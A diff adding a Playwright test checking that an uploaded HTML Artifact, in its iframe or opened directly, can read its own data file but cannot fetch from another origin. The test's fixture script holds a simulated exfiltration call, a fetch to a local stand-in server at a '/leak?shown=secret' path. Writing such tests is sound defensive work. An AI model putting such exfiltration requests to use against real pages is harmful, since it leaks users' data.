@@ -1,3 +1,5 @@
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import type { FrameLocator, Page } from "@playwright/test";
 import { setUp, signIn } from "../test/harness/flows.js";
 import { expect, signInInBrowser, test } from "./fixtures.js";
@@ -126,4 +128,55 @@ test("Comments on an Artifact show on its page and, marked with the Artifact, on
   await expect(onArtifact.getByRole("link", { name: "Board prototype" })).toBeVisible();
   await call("POST", `/api/artifacts/${artifact.id}/comments`, { body: "Done in Version 2." });
   await expect(timeline.getByText("Done in Version 2.")).toBeVisible();
+});
+
+test("an Artifact's page loads its own data file but can't fetch from any other origin, in its iframe or opened directly", async ({
+  page,
+  cronk,
+}) => {
+  // Another origin on this machine, which would answer anyone: only the page's policy can keep it from being reached.
+  const reached: string[] = [];
+  const elsewhere = createServer((request, response) => {
+    reached.push(request.url ?? "");
+    response.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
+    response.end("reached");
+  });
+  await new Promise<void>((resolve) => elsewhere.listen(0, "127.0.0.1", resolve));
+  const elsewhereUrl = `http://127.0.0.1:${(elsewhere.address() as AddressInfo).port}`;
+
+  const script = `
+const report = (id) => (text) => { document.getElementById(id).textContent = text; };
+fetch("data.json").then((response) => response.json()).then((data) => "Own: " + data.name, () => "Own: blocked").then(report("own"));
+fetch(${JSON.stringify(`${elsewhereUrl}/leak?shown=secret`)}).then((response) => response.text()).then((text) => "Elsewhere: " + text, () => "Elsewhere: blocked").then(report("elsewhere"));
+`;
+  const { workspace } = await setUp(cronk);
+  const cookie = await signIn(cronk);
+  const created = await cronk.request("POST", `/api/workspaces/${workspace.id}/artifacts`, {
+    cookie,
+    body: {
+      title: "Fetcher",
+      files: [
+        { path: "index.html", contentBase64: base64(`<!doctype html><title>Fetcher</title><p id="own"></p><p id="elsewhere"></p><script>${script}</script>`) },
+        { path: "data.json", contentBase64: base64(JSON.stringify({ name: "Board data" })) },
+      ],
+    },
+  });
+  expect(created.status).toBe(201);
+  const artifact = await created.json();
+  await signInInBrowser(page, cronk);
+
+  try {
+    await page.goto(`${cronk.url}/artifacts/${artifact.id}`);
+    // The inline script ran, and read the Version's own file.
+    const frame = page.frameLocator("iframe");
+    await expect(frame.locator("#own")).toHaveText("Own: Board data");
+    await expect(frame.locator("#elsewhere")).toHaveText("Elsewhere: blocked");
+
+    await page.goto(new URL(artifact.url, cronk.url).href);
+    await expect(page.locator("#own")).toHaveText("Own: Board data");
+    await expect(page.locator("#elsewhere")).toHaveText("Elsewhere: blocked");
+    expect(reached).toEqual([]);
+  } finally {
+    await new Promise((resolve) => elsewhere.close(resolve));
+  }
 });
